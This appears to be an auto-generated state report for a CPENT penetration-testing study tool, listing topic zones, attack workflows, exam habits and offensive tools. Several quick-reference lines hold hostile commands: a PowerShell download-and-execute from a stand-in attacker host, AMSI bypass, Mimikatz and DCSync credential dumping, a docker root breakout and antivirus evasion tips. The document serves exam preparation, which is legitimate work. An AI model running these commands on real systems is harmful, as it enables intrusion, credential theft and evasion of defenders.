# COMPREHENSIVE PROJECT STATE REPORT
Generated: 2026-08-15T08:02:02.560688

## 1. ZONES (14 total)

| ID | Name | Color | Icon | Weight | Exam Weight | Tools | Techniques | Workflows |
|---|---|---|---|---|---|---|---|---|
| recon | Reconnaissance | #6B7280 | Radar | 10% | 5% | 29 | 14 | 2 |
| network-enum | Network Enumeration | #6366F1 | Network | 10% | 4% | 22 | 3 | 1 |
| active-directory | Active Directory | #E8A020 | Network | 25% | 5% | 35 | 32 | 2 |
| web | Web Applications | #3B82F6 | Globe | 20% | 5% | 36 | 14 | 3 |
| binary-exploitation | Binary Exploitation | #EF4444 | Cpu | 20% | 4% | 28 | 18 | 2 |
| iot-firmware | IoT / Firmware | #10B981 | Server | 15% | 4% | 17 | 11 | 2 |
| privilege-escalation | Privilege Escalation | #F97316 | Shield | 10% | 5% | 29 | 17 | 4 |
| lateral-movement | Lateral Movement | #8B5CF6 | ArrowRight | 10% | 5% | 8 | 2 | 2 |
| password-attacks | Password Attacks | #EC4899 | Key | 10% | 4% | 13 | 3 | 1 |
| post-exploitation | Post Exploitation | #14B8A6 | Activity | 10% | 5% | 6 | 5 | 2 |
| exploitation-frameworks | Exploitation Frameworks | #DC2626 | Zap | 5% | 3% | 16 | 5 | 2 |
| reporting | Reporting | #64748B | FileText | 5% | 2% | 4 | 1 | 1 |
| ctf | CTF Challenges | #A855F7 | Flag | 10% | 3% | 13 | 2 | 1 |
| defense-evasion | Defense Evasion | #DC2626 | ShieldOff | 10% | 3% | 7 | 1 | 1 |

## 2. WORKFLOWS (26 total)

### recon-workflow
- **Name**: Standard Reconnaissance Workflow
- **Zone**: recon
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Standard Reconnaissance Workflow
# Zone: recon
# Steps: 3
# Key tools: see steps below`
- **Phases**: Passive Recon, Active Scanning, Service Enumeration
- **Exam Habits** (1):
  - Master Standard Reconnaissance Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### ad-workflow
- **Name**: Active Directory Compromise Workflow
- **Zone**: active-directory
- **Source**: cpent-reference
- **Steps**: 4
- **QuickRef**: `# Active Directory Compromise Workflow
# Zone: active-directory
# Steps: 4
# Key tools: see steps below`
- **Phases**: Initial Enumeration, Credential Acquisition, Lateral Movement, Persistence
- **Exam Habits** (1):
  - Master Active Directory Compromise Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### web-workflow
- **Name**: Web Application Testing Workflow
- **Zone**: web
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Web Application Testing Workflow
# Zone: web
# Steps: 3
# Key tools: see steps below`
- **Phases**: Reconnaissance, Vulnerability Scanning, Exploitation
- **Exam Habits** (1):
  - Master Web Application Testing Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### binary-workflow
- **Name**: Binary Exploitation Workflow
- **Zone**: binary-exploitation
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Binary Exploitation Workflow
# Zone: binary-exploitation
# Steps: 3
# Key tools: see steps below`
- **Phases**: Initial Analysis, Vulnerability Identification, Exploitation
- **Exam Habits** (1):
  - Master Binary Exploitation Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### iot-workflow
- **Name**: IoT Firmware Analysis Workflow
- **Zone**: iot-firmware
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# IoT Firmware Analysis Workflow
# Zone: iot-firmware
# Steps: 3
# Key tools: see steps below`
- **Phases**: Firmware Acquisition, Static Analysis, Emulation
- **Exam Habits** (1):
  - Master IoT Firmware Analysis Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### privesc-workflow
- **Name**: Privilege Escalation Workflow
- **Zone**: privilege-escalation
- **Source**: cpent-reference
- **Steps**: 2
- **QuickRef**: `# Privilege Escalation Workflow
# Zone: privilege-escalation
# Steps: 2
# Key tools: see steps below`
- **Phases**: Information Gathering, Exploitation
- **Exam Habits** (1):
  - Master Privilege Escalation Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### lateral-movement-workflow
- **Name**: Lateral Movement Workflow
- **Zone**: lateral-movement
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Lateral Movement Workflow
# Zone: lateral-movement
# Steps: 3
# Key tools: see steps below`
- **Phases**: Tunnel Setup, Credential Reuse, Access Internal Resources
- **Exam Habits** (1):
  - Master Lateral Movement Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### password-attacks-workflow
- **Name**: Password Attack Workflow
- **Zone**: password-attacks
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Password Attack Workflow
# Zone: password-attacks
# Steps: 3
# Key tools: see steps below`
- **Phases**: Hash Identification, Wordlist Attack, Brute Force
- **Exam Habits** (1):
  - Master Password Attack Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### post-exploitation-workflow
- **Name**: Post-Exploitation Workflow
- **Zone**: post-exploitation
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Post-Exploitation Workflow
# Zone: post-exploitation
# Steps: 3
# Key tools: see steps below`
- **Phases**: Credential Harvesting, Persistence, C2 Establishment
- **Exam Habits** (1):
  - Master Post-Exploitation Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### exploitation-workflow
- **Name**: Exploitation Framework Workflow
- **Zone**: exploitation-frameworks
- **Source**: cpent-reference
- **Steps**: 2
- **QuickRef**: `# Exploitation Framework Workflow
# Zone: exploitation-frameworks
# Steps: 2
# Key tools: see steps below`
- **Phases**: Exploit Search, Exploitation
- **Exam Habits** (1):
  - Master Exploitation Framework Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### reporting-workflow
- **Name**: Reporting and Documentation Workflow
- **Zone**: reporting
- **Source**: cpent-reference
- **Steps**: 2
- **QuickRef**: `# Reporting and Documentation Workflow
# Zone: reporting
# Steps: 2
# Key tools: see steps below`
- **Phases**: Evidence Collection, Note Organization
- **Exam Habits** (1):
  - Master Reporting and Documentation Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### network-enum-workflow
- **Name**: Network Enumeration Workflow
- **Zone**: network-enum
- **Source**: cpent-reference
- **Steps**: 3
- **QuickRef**: `# Network Enumeration Workflow
# Zone: network-enum
# Steps: 3
# Key tools: see steps below`
- **Phases**: Live Host Discovery, Port Scanning, Service Enumeration
- **Exam Habits** (1):
  - Master Network Enumeration Workflow methodology. Time yourself — CPENT gives 24h. Document every step.

### ad-argha-dey-methodology
- **Name**: Argha Dey Active Directory Attack Methodology
- **Zone**: active-directory
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 10
- **QuickRef**: `nxc smb <range>; impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat; kerberoasting with GetUserSPNs; DCS`
- **Phases**: Phase 1 - Passive & Semi-Passive Recon, Phase 2 - Unauthenticated / Null-Session Enumeration, Phase 3 - Credential Gathering (Spraying & Poisoning), Phase 4 - NTLM Relay (Signing Not Required), Phase 5 - Authenticated Enumeration (LDAP Deep Dive), Phase 6 - Foothold & Shell (Impacket Suite, PtH), Phase 7 - Local Privilege Escalation (Windows), Phase 8 - Domain Privilege Escalation, Phase 9 - Lateral Movement & Domain Dominance, Phase 10 - Persistence
- **Exam Habits** (10):
  - Confirm domain name, forest, DC(s) before exploitation
  - Enumerate all users/groups/computers
  - Check for Kerberoastable / ASREPRoastable accounts
  - Check SMB signing + null session exposure
  - Check trusts (direction, type, foreign principals)
  - Check delegation (unconstrained/constrained/RBCD)
  - Check GPP/SYSVOL for cached creds
  - Attempt DCSync if privileged
  - Extract flags / persistence artifacts as required
  - Document every credential + hash found (reused across trusts often)

### binary-argha-dey-methodology
- **Name**: Argha Dey Binary Exploitation Methodology
- **Zone**: binary-exploitation
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 11
- **QuickRef**: `checksec --file=./binary | ROPgadget --binary ./binary --only 'pop|ret' | python3 -c 'from pwn import *; ...' | gdb -q .`
- **Phases**: Stage 1 - Triage & Protection Check, Stage 2 - Stack-Based Buffer Overflow (no protections), Stage 3 - Return-to-libc (ret2libc) - bypasses NX, Stage 4 - ROP Chains (NX bypass + ASLR), Stage 5 - GOT Overwrite (Partial/No RELRO + Format String), Stage 6 - Format String Exploitation, Stage 7 - Heap Exploitation (overview), Stage 8 - SROP / ret2csu / Integer Overflow, Stage 9 - Shellcoding, Stage 10 - PwnTools Full Workflow Reference, Stage 11 - Exam Playbook: Step-by-Step on Every Binary
- **Exam Habits** (7):
  - Always run checksec --file=binary first - answers almost every protection question in one shot
  - Run the exact sequence: file → checksec → strings|grep flag/bin/pass → gdb break main → info proc mappings → find/ROPgadget
  - For address-of questions: use GDB breakpoints + info proc mappings to compute runtime addresses
  - For ret2libc offset: p system; find /bin/sh; p/x addr_binsh - addr_system (constant regardless of ASLR)
  - If ASLR is on: leak via GOT (puts@plt puts@got + main loop), then compute libc base
  - Understand manual compilation path, not just Metasploit - CPENT often doesn't provide Metasploit access
  - Always verify kernel/software version and patch level before kernel exploits - they can crash the target

### iot-argha-dey-methodology
- **Name**: Argha Dey IoT Firmware Analysis Methodology
- **Zone**: iot-firmware
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 6
- **QuickRef**: `binwalk FileOne.bin; binwalk -eM --dd='.*' FileOne.bin; file <extracted>; strings | grep -i busybox|gcc|linux version; s`
- **Phases**: Stage 1 - Recon/Enumeration, Stage 2 - Firmware Acquisition, Stage 3 - Firmware Static Analysis, Stage 4 - Binary/Runtime Exploitation, Firmware Cheat-Sheet: Question-Pattern → Method Map, Stage 5 - Squashfs-root Directory Hunting Cheatsheet
- **Exam Habits** (8):
  - Always run binwalk before anything else on any .bin file - it answers 60-70% of firmware questions in one shot
  - Check target locale/date format (date command) before answering date-formatted questions - labs use YYYY-DD-MM traps
  - If binwalk shows nothing → suspect encryption; confirm with -E (entropy) flag - high flat entropy + no signatures = encrypted
  - Don't install tools on the target box - pivot file via Python HTTP server + wget (faster, no root/apt needed)
  - Recursive/forced extraction (eM --dd='.*') is fallback when default binwalk doesn't reveal FS name - walk nested folders manually
  - Distinguish standard vs custom directories - questions want non-standard folders (pwnable dir), not /etc, /bin, /usr
  - For device-identification questions: browser page title + quick Google search is fastest (e.g. 'dsp-w215' → HNAP → SOAP family)
  - Always start binary exploitation with file (arch + stripped) → readelf -h/-l → gdb-peda → qemu-<arch>-static if non-native

### linux-privesc-argha-dey-methodology
- **Name**: Argha Dey Linux Privilege Escalation Methodology
- **Zone**: privilege-escalation
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 11
- **QuickRef**: `id && sudo -l && uname -a → linpeas.sh → find / -perm -4000 → getcap -r / → cat /etc/crontab → searchsploit linux kernel`
- **Phases**: Phase 1 - Enumeration (Always Start Here), Phase 2 - SUID / SGID Binary Abuse, Phase 3 - Sudo Misconfigurations, Phase 4 - Cron Jobs, Phase 5 - Environment Variable / PATH Abuse, Phase 6 - Capabilities & File Permission Weaknesses, Phase 7 - Password Hunting & SSH Key Reuse, Phase 8 - NFS no_root_squash, Phase 9 - Container Breakout (Docker/LXD group), Phase 10 - Kernel Exploits (CVE Catalogue), Phase 11 - Post-Exploitation Proof (after root achieved)
- **Exam Habits** (10):
  - Run LinPEAS and review high/red-flagged items first
  - Check SUID/SGID binaries with find / -perm -4000 -type f 2>/dev/null
  - Check capabilities with getcap -r / 2>/dev/null
  - Check sudo rules with sudo -l against GTFOBins
  - Check cron jobs with pspy (monitor without root)
  - Cross-check kernel/sudo/polkit version against known CVEs (Dirty Pipe, PwnKit, Baron Samedit)
  - Check for password/config file leftovers and reused SSH keys
  - If in docker/lxd group: container breakout via docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  - Always verify kernel/software version and patch level first — kernel exploits can crash the target
  - Understand the manual compilation path, not just Metasploit — CPENT exam often doesn't provide Metasploit access

### pivoting-argha-dey-methodology
- **Name**: Argha Dey Pivoting & Tunneling Methodology
- **Zone**: lateral-movement
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 7
- **QuickRef**: `CHISEL: chisel server -p 8000 --reverse (attacker); ./chisel client <kali>:8000 R:socks (pivot); proxychains nmap -sT -P`
- **Phases**: Stage 1 - Core Concepts, Stage 2 - Chisel (A to Z), Stage 3 - Ligolo-ng (A to Z, CLI), Stage 4 - Ligolo-ng GUI (WebUI), Stage 5 - Chisel vs Ligolo-ng Comparison, Stage 6 - Session/Lifecycle Management & Cleanup, Stage 7 - Cross-Platform Notes (Windows/Mac Attacker)
- **Exam Habits** (9):
  - Always confirm dual-homed hosts first - run ifconfig/ip a on every pivot to find the second network leg
  - Use -sT (TCP connect scan), never -sS (SYN) through Ligolo-ng's TUN or proxychains - raw/SYN scans don't traverse tunnels
  - Always use -Pn with nmap when pivoting - ICMP echo often doesn't traverse the tunnel/SOCKS proxy
  - Document each pivot hop - IP addresses, tool used, command run, screenshot routing table (ip route) and session list
  - If Chisel is blocked/detected: prefer Ligolo-ng or rename/obfuscate binaries, fall back to native SSH -R/-D or plink.exe
  - Clean up: kill agents (agent_kill), remove routes (route_del), delete tun interfaces (interface_delete), stop chisel processes
  - When double/triple pivoting: create a NEW distinct tun interface name per hop (ligolo, ligolo-double, ligolo-triple) to avoid route collisions
  - If only ONE service needed (RDP/SMB): Chisel local/remote port-forward is faster than full Ligolo tunnel
  - If enumerating/attacking MANY hosts across a subnet: Ligolo-ng is faster and less error-prone than proxychains + Chisel

### recon-argha-dey-methodology
- **Name**: Argha Dey Master Recon Methodology
- **Zone**: recon
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 15
- **QuickRef**: `nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | whatweb http://<ip>/`
- **Phases**: Phase 1 - Network & Service Recon, Phase 2 - Web Technology Fingerprinting, Phase 3 - Directory, File & Vhost Fuzzing, Phase 4 - Anonymous Service Access (FTP / SMB), Phase 5 - Source Code / Version Control Leaks (.git), Phase 6 - Backup Files & Database Dumps, Phase 7 - CMS / Application-Specific Enumeration, Phase 8 - Intercepting Proxy Workflow (Burp Suite), Phase 9 - Credential Attacks, Phase 10 - File Upload Abuse, Phase 11 - LFI & Log Poisoning, Phase 12 - Command Injection Recon, Phase 13 - IoT / Firmware Recon (adjacent), Phase 14 - Post-Foothold Local Enumeration, Phase 15 - Master Recon Checklist (mental, every new Web Range IP)
- **Exam Habits** (14):
  - nmap -sC -sV -T4 -Pn -A -oN <ip>.txt <ip> - note every open port, not just 80/443
  - If FTP open: try anonymous login, binary +passive, grab everything
  - whatweb / check http-generator, Server header, page title, favicon for tech fingerprint
  - view-source the homepage - read every comment, every <a href>
  - curl -s http://<ip>/robots.txt and /sitemap.xml
  - Directory/file fuzz with feroxbuster (recursive) then ffuf, common.txt first then big.txt
  - Specifically probe for /.git/, /backup/, /.env, /config.php.bak, /uploads/
  - If .git found: git_dumper.py, then git log + git show <every commit>
  - If a login form exists: test for SQLi with single quote; if error, sqlmap -r request.txt --dbs --batch
  - If CMS identified: run the matching scanner (WPScan, etc.) and Google default creds + CVEs for the exact version
  - If a utility feature exists (ping/upload/search/reset-password): test command injection, file-upload bypass, IDOR, and logic-flaw abuse
  - Any parameter that loads a page or file: test LFI, then pivot to log poisoning
  - On foothold: sudo -l, SUID hunt, LinPEAS, GTFOBins, cron jobs, readable id_rsa/config secrets
  - Never stop at the first flag - the chain usually continues to root or pivots to a second host

### web-argha-dey-methodology
- **Name**: Argha Dey Web Exploitation Methodology
- **Zone**: web
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 8
- **QuickRef**: `nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | sqlmap -r request.txt -dbs --batch | wpsca`
- **Phases**: Phase 1 - Recon & Fingerprinting, Phase 2 - SQL Injection (Detection-to-Dump Workflow), Phase 3 - LFI: Detection-to-RCE Decision Tree, Phase 4 - OS Command Injection (Read → Enumerate → Shell), Phase 5 - WordPress: 9-Phase Chain (Fingerprint → RCE), Phase 6 - File Upload Abuse, Phase 7 - Config & Backup File Leak Hunting, Phase 8 - Post-Foothold & Shell Stabilization
- **Exam Habits** (8):
  - nmap's http-generator script output often reveals the exact WP version before running WPScan
  - Save the raw request from Burp and drive sqlmap with -r; don't hand-build -u/-data
  - Always run --batch in an exam/scripted context
  - Enumerate dbs → --tables → --columns → --dump in that order
  - Check every column of every dumped table - CPENT hides the real answer in unexpected columns
  - Note the exact -technique sqlmap reports (boolean/time/union/error)
  - If sqlmap fails, manually test with ' AND SLEEP(5) before assuming not injectable
  - Pivot immediately on any found DB credentials to SSH/other services

### windows-privesc-argha-dey-methodology
- **Name**: Argha Dey Windows Privilege Escalation Methodology
- **Zone**: privilege-escalation
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 12
- **QuickRef**: `systeminfo; whoami /priv; winPEAS.exe; PowerUp Invoke-AllChecks; PrintSpoofer.exe -c cmd (if SeImpersonate); accesschk.e`
- **Phases**: Phase 0 - Baseline Enumeration, Phase 1 - AlwaysInstallElevated, Phase 2 - Unquoted Service Paths, Phase 3 - DLL Hijacking, Phase 4 - Token Impersonation (Potato Family), Phase 5 - Weak Service / File Permissions, Phase 6 - Scheduled Tasks & Registry AutoRun, Phase 7 - GPP Cached Passwords / SYSVOL, Phase 8 - UAC Bypass, Phase 9 - LSA Secrets & SAM Dump (for lateral movement), Phase 10 - Kernel Exploits (CVE Catalogue), Phase 11 - Quick Decision Flow for the Exam
- **Exam Habits** (6):
  - Always check patch level first (wmic qfe) — kernel exploits can BSOD the target
  - Check SeImpersonatePrivilege first — fast win via PrintSpoofer/GodPotato if service account
  - Check services/registry/scheduled tasks/file perms — safe wins, no crash risk
  - Only reach for kernel CVE if OS is unpatched and no config-based win exists
  - Confirm final privilege with whoami /priv + whoami /groups and grab proof (flag/hash)
  - Document: technique used, CVE ID, affected component, command sequence, and remediation

### post-exploitation-argha-dey-methodology
- **Name**: Argha Dey Post-Exploitation Methodology
- **Zone**: post-exploitation
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 9
- **QuickRef**: `Invoke-Mimikatz -DumpCreds | sekurlsa::logonpasswords | lsadump::dcsync /domain:<domain> /user:krbtgt | impacket-secrets`
- **Phases**: Phase 1 - Initial Credential Access, Phase 2 - Pre-Auth Info Leaks (No Credentials Needed), Phase 3 - Credential Gathering from AD, Phase 4 - NTLM Relay (Signing Not Required), Phase 5 - Authenticated Enumeration (LDAP Deep Dive), Phase 6 - Foothold & Shell (Impacket Suite, PtH), Phase 7 - Domain Privilege Escalation, Phase 8 - Persistence, Phase 9 - Cleanup & Covering Tracks
- **Exam Habits** (5):
  - Dump credentials early — don't linger on a box without extracting hashes
  - Mimikatz in-memory via Invoke-Mimikatz to avoid disk-based AV detection
  - Screenshot flags immediately after gaining access
  - Use Beacon/Cobalt Strike for persistent C2 that survives 6+ hours
  - Check for domain admin tokens before attempting domain dominance

### web-app-recon-argha-dey-methodology
- **Name**: Argha Dey Web Application Recon Checklist
- **Zone**: web
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 8
- **QuickRef**: `nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | whatweb http://<ip>/ | wpscan --url http:/`
- **Phases**: Phase 1 - Network & Service Recon, Phase 2 - Web Technology Fingerprinting, Phase 3 - Directory, File & Vhost Fuzzing, Phase 4 - Hidden File & Leak Hunting, Phase 5 - Anonymous Service Access, Phase 6 - CMS / Application-Specific Enumeration, Phase 7 - Intercepting Proxy Workflow, Phase 8 - Master Recon Checklist (mental, every new Web Range IP)
- **Exam Habits** (5):
  - nmap's http-generator script output often reveals the exact CMS/version before running specialized scanners
  - Check ftp-anon in every scan — an FTP open with anonymous allows often contains backup files with creds
  - Always check /robots.txt, /.git/, /backup/, and /server-status/
  - If the site returns the Apache default page, the real app is under a different vhost or path — fuzz for it
  - Use feroxbuster first (faster than gobuster/ffuf) then refine with extension-aware fuzzing

### windows-privesc-argha-dey-v2-methodology
- **Name**: Argha Dey Windows Privilege Escalation Deep Dive
- **Zone**: privilege-escalation
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 8
- **QuickRef**: `systeminfo | findstr /i 'OS.Name OS.Version Hotfix'; whoami /priv; net user; net localgroup administrators`
- **Phases**: Phase 0 - Baseline Enumeration, Phase 1 - AlwaysInstallElevated, Phase 2 - Unquoted Service Paths, Phase 3 - DLL Hijacking, Phase 4 - Token Impersonation (Potato Family), Phase 5 - Weak Service / File Permissions, Phase 6 - Kernel Exploits (CVE Catalogue), Phase 7 - Quick Decision Flow for the Exam
- **Exam Habits** (5):
  - Run systeminfo > systeminfo.txt and check for missing patches first
  - Whoami /priv — always check for SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege
  - Check if PowerShell execution is locked down — try v2, v4, or IEX from memory
  - winPEAS.exe output is huge — pipe to findstr to filter: winPEAS.exe quiet
  - Token manipulation: check who is in the local Administrators group

### reverse-shells-argha-dey-methodology
- **Name**: Argha Dey Reverse Shells & Stabilization Playbook
- **Zone**: exploitation-frameworks
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 5
- **QuickRef**: `rlwrap nc -lvnp 4444 | grep -a 'connect to' | ...`
- **Phases**: Phase 1 - Shell Selection (Choose by Target), Phase 2 - Bind Shell Alternatives, Phase 3 - Shell Stabilization, Phase 4 - Tunneling Through Compromised Host, Phase 5 - Persistence via Reverse Shells
- **Exam Habits** (5):
  - Test reverse shell connectivity with a simple nc listener BEFORE running the payload
  - Always use rlwrap with nc -lvnp to have proper shell history
  - Python pty.spawn for interactive shell; Ctrl+Z + stty raw -echo + fg for terminal upgrade
  - Have socat backup ready — if one-liners fail, use a bind shell via socat
  - Document local IP and port on your attack machine before shell delivery

### ctf-argha-dey-methodology
- **Name**: Argha Dey CTF Challenge Methodology
- **Zone**: ctf
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 6
- **QuickRef**: `file <target> | binwalk -e <target> | steghide extract -sf <file> -p <pass> | exiftool <file> | cyberchef decode`
- **Phases**: Phase 1 - Initial File Analysis, Phase 2 - Decoding & Encoding Challenges, Phase 3 - Steganography, Phase 4 - Cryptography, Phase 5 - Forensics, Phase 6 - Web CTF Exploitation
- **Exam Habits** (5):
  - steghide steghide steghide — try the same passphrase multiple times
  - Check metadata with exiftool on every file first
  - Try CyberChef for common encodings (base64, base32, URL, hex, ROT13, binary, Morse)
  - binwalk -e firmware/images to extract embedded files, then examine each
  - XOR with common keys: 0x41 (A), 0x20 (space), single-byte bruteforce

### defense-evasion-argha-dey-methodology
- **Name**: Argha Dey Defense Evasion Methodology
- **Zone**: defense-evasion
- **Source**: Argha Dey CPENT Notes (94% scorer)
- **Steps**: 5
- **QuickRef**: `powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload'); amsi bypass; Invoke`
- **Phases**: Phase 1 - AMSI Bypass, Phase 2 - Obfuscation & Encoding, Phase 3 - Living Off The Land Binaries (LOLBins), Phase 4 - EDR Evasion, Phase 5 - Log Evasion & Cleanup
- **Exam Habits** (5):
  - PowerShell execution policy bypass: -exec bypass or -ep bypass
  - Use Invoke-Obfuscation for multi-layer obfuscation of PowerShell payloads
  - Reflective loading: load Mimikatz/PE into memory via Rubeus or SafetyKatz to avoid disk writes
  - LOLBins: use regsvr32, rundll32, or mshta for executing payloads without writing to disk
  - Check AMSI before running any PowerShell — patch amsiInitFailed if needed


## 3. TOOLS (263 total)

| ID | Name | Zone | Type | OS | Tags | Commands |
|---|---|---|---|---|---|---|
| nmap | Nmap | recon | scanner | linux, windows, macos | recon, scanning, network, ports, vulnerability | 3 |
| subfinder | Subfinder | recon | enumerator | linux, macos | recon, subdomain, passive, dns, osint | 2 |
| amass | Amass | recon | enumerator | linux, macos | recon, subdomain, dns, osint, attack-surface | 2 |
| httpx | HTTPX | recon | scanner | linux, macos | recon, web, http, probing, technology-detection | 2 |
| naabu | Naabu | recon | scanner | linux, macos, windows | recon, ports, scanning, fast | 2 |
| masscan | Masscan | recon | scanner | linux, macos | recon, ports, scanning, fast, internet-scale | 2 |
| bloodhound | BloodHound | active-directory | analyzer | linux, windows | active-directory, enumeration, graph, attack-paths, powershell | 2 |
| impacket | Impacket | active-directory | framework | linux, windows | active-directory, smb, credentials, python, rpc | 3 |
| crackmapexec | CrackMapExec | active-directory | framework | linux, windows | active-directory, post-exploitation, smb, winrm, enumeration | 2 |
| evil-winrm | Evil-WinRM | active-directory | shell | linux, macos | active-directory, winrm, shell, remote, powershell | 2 |
| kerbrute | Kerbrute | active-directory | cracker | linux, macos, windows | active-directory, kerberos, enumeration, brute-force, usernames | 2 |
| powerview | PowerView | active-directory | framework | windows | active-directory, enumeration, powershell, domain | 2 |
| mimikatz | Mimikatz | active-directory | cracker | windows | active-directory, credentials, hashing, memory, passwords | 2 |
| certipy | Certipy | active-directory | framework | linux | active-directory, certificate, esc, adcs, authentication | 2 |
| burp-suite | Burp Suite | web | proxy | linux, windows, macos | web, proxy, testing, owasp, api | 2 |
| sqlmap | SQLMap | web | exploitation | linux, windows, macos | web, sqli, injection, database, automation | 3 |
| gobuster | Gobuster | web | scanner | linux, windows, macos | web, directory, brute-force, recon, files | 2 |
| ffuf | FFUF | web | scanner | linux, macos, windows | web, fuzzing, directory, parameter, vhost | 2 |
| wpscan | WPScan | web | scanner | linux, macos | web, wordpress, cms, vulnerability, scanning | 2 |
| nuclei | Nuclei | web | scanner | linux, macos, windows | web, vulnerability, scanning, template, automation | 2 |
| feroxbuster | Feroxbuster | web | scanner | linux, macos, windows | web, directory, brute-force, recursion, recon | 2 |
| nikto | Nikto | web | scanner | linux, windows | web, scanning, vulnerability, servers | 2 |
| gdb | GDB with pwndbg | binary-exploitation | debugger | linux | binary, debugging, exploitation, reverse-engineering, gdb | 2 |
| pwntools | Pwntools | binary-exploitation | framework | linux | binary, exploitation, python, ctf, automation | 2 |
| ropper | Ropper | binary-exploitation | analyzer | linux, windows | binary, rop, gadgets, exploitation | 2 |
| one_gadget | One Gadget | binary-exploitation | analyzer | linux | binary, libc, exploitation, rop, shell | 2 |
| checksec | Checksec | binary-exploitation | analyzer | linux | binary, security, protections, analysis | 2 |
| radare2 | Radare2 | binary-exploitation | analyzer | linux, windows, macos | binary, reverse-engineering, analysis, disassembly | 2 |
| binwalk | Binwalk | iot-firmware | analyzer | linux, macos | iot, firmware, extraction, embedded, reverse-engineering | 2 |
| firmware-mod-kit | Firmware Mod Kit | iot-firmware | framework | linux | iot, firmware, modification, extraction | 2 |
| qemu | QEMU | iot-firmware | emulator | linux, macos | iot, firmware, emulation, dynamic-analysis | 2 |
| sasquatch | Sasquatch | iot-firmware | analyzer | linux | iot, firmware, extraction, squashfs, embedded | 2 |
| cyberchef | CyberChef | ctf | tool | linux, windows, macos | ctf, encoding, encryption, steganography, forensics | 2 |
| stegsolve | Stegsolve | ctf | analyzer | linux, windows, macos | ctf, steganography, images, forensics | 2 |
| stegcracker | StegCracker | ctf | cracker | linux, macos | ctf, steganography, cracking, brute-force | 2 |
| exiftool | ExifTool | ctf | analyzer | linux, windows, macos | ctf, forensics, metadata, images, analysis | 2 |
| enum4linux | enum4linux-ng | active-directory | enumerator | linux | active-directory, enumeration, smb, rpc, ldap | 2 |
| smbmap | SMBMap | network-enum | enumerator | linux, windows | network-enum, smb, shares, enumeration, permissions | 2 |
| smbclient | SMBClient | network-enum | client | linux, windows | network-enum, smb, shares, enumeration, client | 2 |
| rpcclient | RPCClient | active-directory | client | linux | active-directory, rpc, enumeration, smb, windows | 2 |
| ldapsearch | ldapsearch | active-directory | client | linux | active-directory, ldap, enumeration, directory | 2 |
| hashcat | Hashcat | password-attacks | cracker | linux, windows | password-attacks, hashing, cracking, gpu, recovery | 2 |
| john | John the Ripper | password-attacks | cracker | linux, windows, macos | password-attacks, hashing, cracking, brute-force | 2 |
| hydra | Hydra | password-attacks | cracker | linux, windows, macos | password-attacks, brute-force, login, network, online | 2 |
| linpeas | LinPEAS | privilege-escalation | analyzer | linux | privilege-escalation, linux, enumeration, audit, suid | 2 |
| winpeas | WinPEAS | privilege-escalation | analyzer | windows | privilege-escalation, windows, enumeration, audit | 2 |
| linenum | LinEnum | privilege-escalation | analyzer | linux | privilege-escalation, linux, enumeration, audit | 2 |
| powerup | PowerUp | privilege-escalation | framework | windows | privilege-escalation, windows, powershell, services, unquoted-paths | 2 |
| chisel | Chisel | lateral-movement | proxy | linux, windows | lateral-movement, pivoting, tunneling, socks, proxy | 2 |
| ligolo-ng | Ligolo-NG | lateral-movement | proxy | linux, windows | lateral-movement, pivoting, tunneling, socks, proxy | 2 |
| proxychains4 | Proxychains4 | lateral-movement | proxy | linux | lateral-movement, pivoting, proxy, tunneling | 2 |
| socat | Socat | lateral-movement | proxy | linux | lateral-movement, relay, tunneling, tcp | 2 |
| metasploit | Metasploit Framework | exploitation-frameworks | framework | linux, windows | exploitation, framework, exploits, post-exploitation, modules | 2 |
| searchsploit | SearchSploit | exploitation-frameworks | analyzer | linux, windows | exploitation, exploits, search, vulnerability | 2 |
| whois | Whois | recon | tool | linux, windows, macos | recon, whois, domain, passive, osint | 2 |
| steghide | Steghide | ctf | analyzer | linux, windows, macos | ctf, steganography, images, audio, hidden | 2 |
| powershell | PowerShell | active-directory | framework | windows | active-directory, windows, scripting, automation, powershell | 2 |
| empire | Empire | post-exploitation | framework | linux, windows | post-exploitation, c2, powershell, python, agents | 2 |
| covenant | Covenant | post-exploitation | framework | linux, windows | post-exploitation, c2, .net, dotnet, agents | 2 |
